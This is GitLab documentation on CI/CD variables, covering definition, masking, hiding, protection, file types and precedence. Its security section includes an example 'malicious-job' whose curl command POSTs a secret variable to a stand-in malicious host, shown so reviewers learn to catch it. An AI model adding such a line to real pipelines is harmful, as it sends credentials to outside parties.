CI/CD variables are a type of environment variable. You can use them to:

- Control the behavior of jobs and [pipelines](../pipelines/_index.md).
- Store values you want to re-use, for example in [job scripts](job_scripts.md).
- Avoid hard-coding values in your `.gitlab-ci.yml` file.

You can [override variable values](#cicd-variable-precedence) for a specific pipeline when you [run a pipeline manually](../pipelines/_index.md#run-a-pipeline-manually), [run a manual job](../jobs/job_control.md#specify-variables-when-running-manual-jobs),
or have them [prefilled in manual pipelines](../pipelines/_index.md#prefill-variables-in-manual-pipelines).

Variable names are limited by the [shell the runner uses](https://docs.gitlab.com/runner/shells/)
to execute scripts. Each shell has its own set of reserved variable names.

To ensure consistent behavior, you should always put variable values in single or double quotes.
Variables are internally parsed by the [Psych YAML parser](https://docs.ruby-lang.org/en/master/Psych.html),
so quoted and unquoted variables might be parsed differently. For example, `VAR1: 012345`
is interpreted as an octal value, so the value becomes `5349`, but `VAR1: "012345"` is parsed
as a string with a value of `012345`.

For more information about advanced use of GitLab CI/CD, see [7 advanced GitLab CI workflow hacks](https://about.gitlab.com/webcast/7cicd-hacks/) shared by GitLab engineers.

## Predefined CI/CD variables

GitLab CI/CD makes a set of [predefined CI/CD variables](predefined_variables.md)
available for use in pipeline configuration and job scripts. These variables contain
information about the job, pipeline, and other values you might need when the pipeline
is triggered or running.

You can use predefined CI/CD variables in your `.gitlab-ci.yml` without declaring them first.
For example:

```yaml
job1:
  stage: test
  script:
    - echo "The job's stage is '$CI_JOB_STAGE'"
```

The script in this example outputs `The job's stage is 'test'`.

## Define a CI/CD variable in the `.gitlab-ci.yml` file

To create a CI/CD variable in the `.gitlab-ci.yml` file, define the variable and
value with the [`variables`](../yaml/_index.md#variables) keyword.

Variables saved in the `.gitlab-ci.yml` file are visible to all users with access to
the repository, and should store only non-sensitive project configuration. For example,
the URL of a database saved in a `DATABASE_URL` variable. Sensitive variables containing values
like secrets or keys should be [added in the UI](#define-a-cicd-variable-in-the-ui).

You can define `variables` in:

- A job: The variable is only available in that job's `script`, `before_script`, or `after_script` sections, and with some [job keywords](../yaml/_index.md#job-keywords).
- The top-level of the `.gitlab-ci.yml` file: The variable is available as a default for all jobs in a pipeline, unless a job defines a variable with the same name. The job's variable takes precedence.

In both cases, you cannot use these variables with [global keywords](../yaml/_index.md#global-keywords).

For example:

```yaml
variables:
  ALL_JOBS_VAR: "A default variable"

job1:
  variables:
    JOB1_VAR: "Job 1 variable"
  script:
    - echo "Variables are '$ALL_JOBS_VAR' and '$JOB1_VAR'"

job2:
  variables:
    ALL_JOBS_VAR: "Different value than default"
    JOB2_VAR: "Job 2 variable"
  script:
    - echo "Variables are '$ALL_JOBS_VAR', '$JOB2_VAR', and '$JOB1_VAR'"
```

In this example:

- `job1` outputs: `Variables are 'A default variable' and 'Job 1 variable'`
- `job2` outputs: `Variables are 'Different value than default', 'Job 2 variable', and ''`

Use the [`value` and `description`](../yaml/_index.md#variablesdescription) keywords
to define [variables that are prefilled](../pipelines/_index.md#prefill-variables-in-manual-pipelines)
for [manually-triggered pipelines](../pipelines/_index.md#run-a-pipeline-manually).

### Skip default variables in a single job

If you don't want default variables to be available in a job, set `variables`
to `{}`:

```yaml
variables:
  DEFAULT_VAR: "A default variable"

job1:
  variables: {}
  script:
    - echo This job does not need any variables
```

## Define a CI/CD variable in the UI

Sensitive variables like tokens or passwords should be stored in the settings in the UI,
not [in the `.gitlab-ci.yml` file](#define-a-cicd-variable-in-the-gitlab-ciyml-file).
Add CI/CD variables in the UI:

- For a project [in the project's settings](#for-a-project).
- For all projects in a group [in the group's setting](#for-a-group).
- For all projects in a GitLab instance [in the instance's settings](#for-an-instance).

Alternatively, these variables can be added by using the API:

- [With the project-level variables API endpoint](../../api/project_level_variables.md).
- [With the group-level variables API endpoint](../../api/group_level_variables.md).
- [With the instance-level variables API endpoint](../../api/instance_level_ci_variables.md).

By default, pipelines from forked projects can't access the CI/CD variables available to the parent project.
If you [run a merge request pipeline in the parent project for a merge request from a fork](../pipelines/merge_request_pipelines.md#run-pipelines-in-the-parent-project),
all variables become available to the pipeline.

### For a project

You can add CI/CD variables to a project's settings. Projects can have a maximum of 8000 CI/CD variables.

Prerequisites:

- You must be a project member with the Maintainer role.

To add or update variables in the project settings:

1. On the left sidebar, select **Search or go to** and find your project.
1. Select **Settings > CI/CD**.
1. Expand **Variables**.
1. Select **Add variable** and fill in the details:
   - **Key**: Must be one line, with no spaces, using only letters, numbers, or `_`.
   - **Value**: No limitations.
   - **Type**: `Variable` (default) or [`File`](#use-file-type-cicd-variables).
   - **Environment scope**: Optional. **All (default)** (`*`), a specific [environment](../environments/_index.md#types-of-environments),
     or a wildcard [environment scope](../environments/_index.md#limit-the-environment-scope-of-a-cicd-variable).
   - **Protect variable** Optional. If selected, the variable is only available in pipelines
     that run on [protected branches](../../user/project/repository/branches/protected.md)
     or [protected tags](../../user/project/protected_tags.md).
   - **Visibility**: Select **Visible** (default), [**Masked**](#mask-a-cicd-variable),
     or [**Masked and hidden**](#hide-a-cicd-variable) (only available for new variables).

After you create a variable, you can use it in the pipeline configuration
or in [job scripts](job_scripts.md).

### For a group

You can make a CI/CD variable available to all projects in a group. Groups can have a maximum of 30000 CI/CD variables.

Prerequisites:

- You must be a group member with the Owner role.

To add a group variable:

1. On the left sidebar, select **Search or go to** and find your group.
1. Select **Settings > CI/CD**.
1. Expand **Variables**.
1. Select **Add variable** and fill in the details:
   - **Key**: Must be one line, with no spaces, using only letters, numbers, or `_`.
   - **Value**: No limitations.
   - **Type**: `Variable` (default) or [`File`](#use-file-type-cicd-variables).
   - **Protect variable** Optional. If selected, the variable is only available in pipelines
     that run on [protected branches](../../user/project/repository/branches/protected.md)
     or [protected tags](../../user/project/protected_tags.md).
   - **Visibility**: Select **Visible** (default), [**Masked**](#mask-a-cicd-variable),
     or [**Masked and hidden**](#hide-a-cicd-variable) (only available for new variables).

The group variables that are available in a project are listed in the project's
**Settings > CI/CD > Variables** section. Variables from [subgroups](../../user/group/subgroups/_index.md)
are recursively inherited.

#### Environment scope

{{< details >}}

- Tier: Premium, Ultimate

{{< /details >}}

To set a group CI/CD variable to only be available for certain environments:

1. On the left sidebar, select **Search or go to** and find your group.
1. Select **Settings > CI/CD**.
1. Expand **Variables**.
1. To the right of the variable, select **Edit** ({{< icon name="pencil" >}}).
1. For **Environment scope**, select **All (default)** (`*`), a specific [environment](../environments/_index.md#types-of-environments),
   or a wildcard [environment scope](../environments/_index.md#limit-the-environment-scope-of-a-cicd-variable).

### For an instance

{{< details >}}

- Tier: Free, Premium, Ultimate
- Offering: GitLab Self-Managed, GitLab Dedicated

{{< /details >}}

You can make a CI/CD variable available to all projects and groups in a GitLab instance.

Prerequisites:

- You must have administrator access to the instance.

To add an instance variable:

1. On the left sidebar, at the bottom, select **Admin**.
1. Select **Settings > CI/CD**.
1. Expand **Variables**.
1. Select **Add variable** and fill in the details:
   - **Key**: Must be one line, with no spaces, using only letters, numbers, or `_`.
   - **Value**: The value is limited to 10,000 characters, but also bounded by any limits in the
     runner's operating system.
   - **Type**: `Variable` (default) or [`File`](#use-file-type-cicd-variables).
   - **Protect variable** Optional. If selected, the variable is only available in pipelines
     that run on [protected branches](../../user/project/repository/branches/protected.md)
     or [protected tags](../../user/project/protected_tags.md).
   - **Visibility**: Select **Visible** (default), [**Masked**](#mask-a-cicd-variable),
     or [**Masked and hidden**](#hide-a-cicd-variable) (only available for new variables).

## CI/CD variable security

Code pushed to the `.gitlab-ci.yml` file could compromise your variables. Variables could
be accidentally exposed in a job log, or maliciously sent to a third party server.

Review all merge requests that introduce changes to the `.gitlab-ci.yml` file before you:

- [Run a pipeline in the parent project for a merge request submitted from a forked project](../pipelines/merge_request_pipelines.md#run-pipelines-in-the-parent-project).
- Merge the changes.

Review the `.gitlab-ci.yml` file of imported projects before you add files or run pipelines against them.

The following example shows malicious code in a `.gitlab-ci.yml` file:

```yaml
accidental-leak-job:
  script:                                         # Password exposed accidentally
    - echo "This script logs into the DB with $USER $PASSWORD"
    - db-login $USER $PASSWORD

malicious-job:
  script:                                         # Secret exposed maliciously
    - curl --request POST --data "secret_variable=$SECRET_VARIABLE" "https://maliciouswebsite.abcd/"
```

To help reduce the risk of accidentally leaking secrets through scripts like in `accidental-leak-job`,
all variables containing sensitive information should always be [masked in job logs](#mask-a-cicd-variable).
You can also [limit a variable to protected branches and tags only](#protect-a-cicd-variable).

Alternatively, use one of the native GitLab integrations to connect with third party
secrets manager providers to store and retrieve secrets:

- [HashiCorp Vault](../secrets/_index.md)
- [Azure Key Vault](../secrets/azure_key_vault.md)
- [Google Secret Manager](../secrets/gcp_secret_manager.md)

You can also use [OpenID Connect (OIDC) authentication](../secrets/id_token_authentication.md)
for secrets managers which do not have a native integration.

Malicious scripts like in `malicious-job` must be caught during the review process.
Reviewers should never trigger a pipeline when they find code like this, because
malicious code can compromise both masked and protected variables.

Variable values are encrypted using [`aes-256-cbc`](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard)
and stored in the database. This data can only be read and decrypted with a
valid [secrets file](../../administration/backup_restore/troubleshooting_backup_gitlab.md#when-the-secrets-file-is-lost).

### Mask a CI/CD variable

{{< alert type="warning" >}}

Masking a CI/CD variable is not a guaranteed way to prevent malicious users from
accessing variable values. To ensure security of sensitive information,
consider using [external secrets](../secrets/_index.md) and [file type variables](#use-file-type-cicd-variables)
to prevent commands such as `env`/`printenv` from printing secret variables.

{{< /alert >}}

You can mask a project, group, or instance CI/CD variable so the value of the variable
does not display in job logs. When a masked CI/CD variable would be displayed in a job log,
the value is replaced with `[masked]` to prevent the value from being exposed.

Prerequisites:

- You must have the same role or access level as required to [add a CI/CD variable in the UI](#define-a-cicd-variable-in-the-ui).

To mask a variable:

1. For the group, project, or in the **Admin** area, select **Settings > CI/CD**.
1. Expand **Variables**.
1. Next to the variable you want to protect, select **Edit**.
1. Under **Visibility**, select **Mask variable**.
1. Select **Update variable**.

The method used to mask variables [limits what can be included in a masked variable](https://gitlab.com/gitlab-org/gitlab-foss/-/issues/13784#note_106756757).
The value of the variable must:

- Be a single line with no spaces.
- Be 8 characters or longer.
- Not match the name of an existing predefined or custom CI/CD variable.
- Not include non-alphanumeric characters other than `@`, `_`, `-`, `:`, or `+`.

Additionally, if [variable expansion](#prevent-cicd-variable-expansion) is enabled,
the value can contain only:

- Characters from the Base64 alphabet (RFC4648).
- The `@`, `:`, `.`, or `~` characters.

Masking a variable automatically masks the value anywhere in a job log. If another
variable has the same value, that value is also masked, including when a variable
references a masked variable. The string `[MASKED]` is shown instead of the value,
possibly with some trailing `x` characters.

Secrets could be revealed when `CI_DEBUG_SERVICES` is enabled. For details, read about [service container logging](../services/_index.md#capturing-service-container-logs).

### Hide a CI/CD variable

{{< history >}}

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/29674) in GitLab 17.4 [with a flag](../../administration/feature_flags/_index.md) named `ci_hidden_variables`. Enabled by default.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/165843) in GitLab 17.6. Feature flag `ci_hidden_variables` removed.

{{< /history >}}

In addition to masking, you can also prevent the value of CI/CD variables from being revealed
in the **CI/CD** settings page. Hiding a variable is only possible when creating a new variable,
you cannot update an existing variable to be hidden.

Prerequisites:

- You must have the same role or access level as required to [add a CI/CD variable in the UI](#define-a-cicd-variable-in-the-ui).
- The variable value must match the [requirements for masked variables](#mask-a-cicd-variable).

To hide a variable, select **Masked and hidden** in the **Visibility** section when
you [add a new CI/CD variable in the UI](#define-a-cicd-variable-in-the-ui).
After you save the variable, the variable can be used in CI/CD pipelines, but cannot
be revealed in the UI again.

### Protect a CI/CD variable

You can configure a project, group, or instance CI/CD variable to be available
only to pipelines that run on [protected branches](../../user/project/repository/branches/protected.md)
or [protected tags](../../user/project/protected_tags.md).

[Merged results pipelines](../pipelines/merged_results_pipelines.md) and [merge request pipelines](../pipelines/merge_request_pipelines.md) can optionally [access protected variables](../pipelines/merge_request_pipelines.md#control-access-to-protected-variables-and-runners).

Prerequisites:

- You must have the same role or access level as required to [add a CI/CD variable in the UI](#define-a-cicd-variable-in-the-ui).

To set a variable as protected:

1. For the project or group, go to **Settings > CI/CD**.
1. Expand **Variables**.
1. Next to the variable you want to protect, select **Edit**.
1. Select the **Protect variable** checkbox.
1. Select **Update variable**.

The variable is available for all subsequent pipelines.

### Use file type CI/CD variables

All predefined CI/CD variables and variables defined in the `.gitlab-ci.yml` file
are "variable" type ([`variable_type` of `env_var` in the API](#define-a-cicd-variable-in-the-ui)).
Variable type variables:

- Consist of a key and value pair.
- Are made available in jobs as environment variables, with:
  - The CI/CD variable key as the environment variable name.
  - The CI/CD variable value as the environment variable value.

Project, group, and instance CI/CD variables are "variable" type by default, but can
optionally be set as a "file" type ([`variable_type` of `file` in the API](#define-a-cicd-variable-in-the-ui)).
File type variables:

- Consist of a key, value, and file.
- Are made available in jobs as environment variables, with:
  - The CI/CD variable key as the environment variable name.
  - The CI/CD variable value saved to a temporary file.
  - The path to the temporary file as the environment variable value.

Use file type CI/CD variables for tools that need a file as input. [The AWS CLI](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-envvars.html)
and [`kubectl`](https://kubernetes.io/docs/concepts/configuration/organize-cluster-access-kubeconfig/#the-kubeconfig-environment-variable)
are both tools that use `File` type variables for configuration.

For example, if you are using `kubectl` with:

- A variable with a key of `KUBE_URL` and `https://example.com` as the value.
- A file type variable with a key of `KUBE_CA_PEM` and a certificate as the value.

Pass `KUBE_URL` as a `--server` option, which accepts a variable, and pass `$KUBE_CA_PEM`
as a `--certificate-authority` option, which accepts a path to a file:

```shell
kubectl config set-cluster e2e --server="$KUBE_URL" --certificate-authority="$KUBE_CA_PEM"
```

#### Use a `.gitlab-ci.yml` variable as a file type variable

You cannot set a CI/CD variable [defined in the `.gitlab-ci.yml` file](#define-a-cicd-variable-in-the-gitlab-ciyml-file)
as a file type variable. If you have a tool that requires a file path as an input,
but you want to use a variable defined in the `.gitlab-ci.yml`:

- Run a command that saves the value of the variable in a file.
- Use that file with your tool.

For example:

```yaml
variables:
  SITE_URL: "https://gitlab.example.com"

job:
  script:
    - echo "$SITE_URL" > "site-url.txt"
    - mytool --url-file="site-url.txt"
```

## Prevent CI/CD variable expansion

Expanded variables treat values with the `$` character as a reference to another variable.
CI/CD variables are expanded by default. To treat variables with a `$` character as raw strings,
disable variable expansion for the variable

Prerequisites:

- You must have the same role or access level as required to [add a CI/CD variable in the UI](#define-a-cicd-variable-in-the-ui).

To disable variable expansion for the variable:

1. For the project or group, go to **Settings > CI/CD**.
1. Expand **Variables**.
1. Next to the variable you want to do not want expanded, select **Edit**.
1. Clear the **Expand variable** checkbox.
1. Select **Update variable**.

## CI/CD variable precedence

{{< history >}}

- Scan Execution Policies variable precedence was [changed](https://gitlab.com/gitlab-org/gitlab/-/issues/424028) in GitLab 16.7 [with a flag](../../administration/feature_flags/_index.md) named `security_policies_variables_precedence`. Enabled by default. [Feature flag removed in GitLab 16.8](https://gitlab.com/gitlab-org/gitlab/-/issues/435727).

{{< /history >}}

You can use CI/CD variables with the same name in different places, but the values
can overwrite each other. The type of variable and where they are defined determines
which variables take precedence.

The order of precedence for variables is (from highest to lowest):

1. [Pipeline execution policy variables](../../user/application_security/policies/pipeline_execution_policies.md#cicd-variables).
1. [Scan execution policy variables](../../user/application_security/policies/scan_execution_policies.md).
1. [Pipeline variables](#use-pipeline-variables). These variables all have the same precedence:
   - [Variables passed to downstream pipelines](../pipelines/downstream_pipelines.md#pass-cicd-variables-to-a-downstream-pipeline).
   - [Trigger variables](../triggers/_index.md#pass-cicd-variables-in-the-api-call).
   - [Scheduled pipeline variables](../pipelines/schedules.md#add-a-pipeline-schedule).
   - [Manual pipeline run variables](../pipelines/_index.md#run-a-pipeline-manually).
   - Variables added when [creating a pipeline with the API](../../api/pipelines.md#create-a-new-pipeline).
   - [Manual job variables](../jobs/job_control.md#specify-variables-when-running-manual-jobs).
1. Project [variables](#for-a-project).
1. Group [variables](#for-a-group). If the same variable name exists in a
   group and its subgroups, the job uses the value from the closest subgroup. For example, if
   you have `Group > Subgroup 1 > Subgroup 2 > Project`, the variable defined in
   `Subgroup 2` takes precedence.
1. Instance [variables](#for-an-instance).
1. [Variables from `dotenv` reports](job_scripts.md#pass-an-environment-variable-to-another-job).
1. Job variables, defined in jobs in the `.gitlab-ci.yml` file.
1. Default variables for all jobs, defined at the top-level of the `.gitlab-ci.yml` file.
1. [Deployment variables](predefined_variables.md#deployment-variables).
1. [Predefined variables](predefined_variables.md).

For example:

```yaml
variables:
  API_TOKEN: "default"

job1:
  variables:
    API_TOKEN: "secure"
  script:
    - echo "The variable is '$API_TOKEN'"
```

In this example, `job1` outputs `The variable is 'secure'` because variables defined in jobs in the `.gitlab-ci.yml` file
have higher precedence than default variables.

## Use pipeline variables

Pipeline variables are variables that are specified when running a new pipeline.

Prerequisites:

- You must have the Developer role in the project.

You can specify a pipeline variable when you:

- [Run a pipeline manually](../pipelines/_index.md#run-a-pipeline-manually) in the UI.
- Create a pipeline by using [the `pipelines` API endpoint](../../api/pipelines.md#create-a-new-pipeline).
- Create a pipeline by using [the `triggers` API endpoint](../triggers/_index.md#pass-cicd-variables-in-the-api-call).
- Use [push options](../../topics/git/commit.md#push-options-for-gitlab-cicd).
- Pass variables to a downstream pipeline by using either the [`variables` keyword](../pipelines/downstream_pipelines.md#pass-cicd-variables-to-a-downstream-pipeline),
  [`trigger:forward` keyword](../yaml/_index.md#triggerforward) or [`dotenv` variables](../pipelines/downstream_pipelines.md#pass-dotenv-variables-created-in-a-job).

These variables have [higher precedence](#cicd-variable-precedence) and can override
other defined variables, including [predefined variables](predefined_variables.md).

{{< alert type="warning" >}}

You should avoid overriding predefined variables in most cases, as it can cause the pipeline to behave unexpectedly.

{{< /alert >}}

{{< alert type="note" >}}

In [GitLab 17.7](../../update/deprecations.md#increased-default-security-for-use-of-pipeline-variables)
and later, [pipeline inputs](../inputs/_index.md#for-a-pipeline) are recommended over passing pipeline variables.
For enhanced security, you should [disable pipeline variables](#restrict-pipeline-variables) when using inputs.

{{< /alert >}}

### Restrict pipeline variables

{{< history >}}

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/440338) in GitLab 17.1.
- For GitLab.com, setting defaults [updated for all new projects in new namespaces](https://gitlab.com/gitlab-org/gitlab/-/issues/502382)
  to `no_one_allowed` for `ci_pipeline_variables_minimum_override_role` in GitLab 17.7.

{{< /history >}}

You can limit who can [run pipelines with pipeline variables](#use-pipeline-variables)
to specific user roles. When users with a lower role try to use pipeline variables,
they receive an `Insufficient permissions to set pipeline variables` error message.

Prerequisites:

- You must have the Maintainer role in the project. If the minimum role was previously set to `owner`
  or `no_one_allowed`, then you must have the Owner role in the project.

To limit the use of pipeline variables to only the Maintainer role and higher:

- Go to **Settings > CI/CD > Variables**.
- Under **Minimum role to use pipeline variables**, select one of:
  - `no_one_allowed`: No pipelines can run with pipeline variables.
    Default for new projects in new namespaces on GitLab.com.
  - `owner`: Only users with the Owner role can run pipelines with pipeline variables.
    You must have the Owner role for the project to change the setting to this value.
  - `maintainer`: Only users with at least the Maintainer role can run pipelines with pipeline variables.
    Default when not specified on GitLab Self-Managed and GitLab Dedicated.
  - `developer`: Only users with at least the Developer role can run pipelines with pipeline variables.

You can also use [the projects API](../../api/projects.md#edit-a-project) to set
the role for the `ci_pipeline_variables_minimum_override_role` setting.

This restriction does not affect the use of CI/CD variables from the project or group settings.
Most jobs can still use the `variables` keyword in the YAML configuration, but not
jobs that use the `trigger` keyword to trigger downstream pipelines. Trigger jobs
pass variables to a downstream pipelines as pipeline variables, which is also controlled
by this setting.

## Exporting variables

Scripts executed in separate shell contexts do not share exports, aliases,
local function definitions, or any other local shell updates.

This means that if a job fails, variables created by user-defined scripts are not
exported.

When runners execute jobs defined in `.gitlab-ci.yml`:

- Scripts specified in `before_script` and the main script are executed together in
  a single shell context, and are concatenated.
- Scripts specified in `after_script` run in a shell context completely separate to
  the `before_script` and the specified scripts.

Regardless of the shell the scripts are executed in, the runner output includes:

- Predefined variables.
- Variables defined in:
  - Instance, group, or project CI/CD settings.
  - The `.gitlab-ci.yml` file in the `variables:` section.
  - The `.gitlab-ci.yml` file in the `secrets:` section.
  - The `config.toml`.

The runner cannot handle manual exports, shell aliases, and functions executed in the body of the script, like `export MY_VARIABLE=1`.

For example, in the following `.gitlab-ci.yml` file, the following scripts are defined:

```yaml
job:
 variables:
   JOB_DEFINED_VARIABLE: "job variable"
 before_script:
   - echo "This is the 'before_script' script"
   - export MY_VARIABLE="variable"
 script:
   - echo "This is the 'script' script"
   - echo "JOB_DEFINED_VARIABLE's value is ${JOB_DEFINED_VARIABLE}"
   - echo "CI_COMMIT_SHA's value is ${CI_COMMIT_SHA}"
   - echo "MY_VARIABLE's value is ${MY_VARIABLE}"
 after_script:
   - echo "JOB_DEFINED_VARIABLE's value is ${JOB_DEFINED_VARIABLE}"
   - echo "CI_COMMIT_SHA's value is ${CI_COMMIT_SHA}"
   - echo "MY_VARIABLE's value is ${MY_VARIABLE}"
```

When the runner executes the job:

1. `before_script` is executed:
   1. Prints to the output.
   1. Defines the variable for `MY_VARIABLE`.
1. `script` is executed:
   1. Prints to the output.
   1. Prints the value of `JOB_DEFINED_VARIABLE`.
   1. Prints the value of `CI_COMMIT_SHA`.
   1. Prints the value of `MY_VARIABLE`.
1. `after_script` is executed in a new, separate shell context:
   1. Prints to the output.
   1. Prints the value of `JOB_DEFINED_VARIABLE`.
   1. Prints the value of `CI_COMMIT_SHA`.
   1. Prints an empty value of `MY_VARIABLE`. The variable value cannot be detected because `after_script` is in a separate shell context to `before_script`.

- You can configure [Auto DevOps](../../topics/autodevops/_index.md) to pass CI/CD variables
  to a running application. To make a CI/CD variable available as an environment variable in the running application's container,
  [prefix the variable key](../../topics/autodevops/cicd_variables.md#configure-application-secret-variables)
  with `K8S_SECRET_`.

- The [Managing the Complex Configuration Data Management Monster Using GitLab](https://www.youtube.com/watch?v=v4ZOJ96hAck)
  video is a walkthrough of the [Complex Configuration Data Monorepo](https://gitlab.com/guided-explorations/config-data-top-scope/config-data-subscope/config-data-monorepo)
  working example project. It explains how multiple levels of group CI/CD variables
  can be combined with environment-scoped project variables for complex configuration
  of application builds or deployments.

  The example can be copied to your own group or instance for testing. More details
  on what other GitLab CI patterns are demonstrated are available at the project page.

- You can [pass CI/CD variables to downstream pipelines](../pipelines/downstream_pipelines.md#pass-cicd-variables-to-a-downstream-pipeline).
  Use [`trigger:forward` keyword](../yaml/_index.md#triggerforward) to specify what type of variables
  to pass to the downstream pipeline.
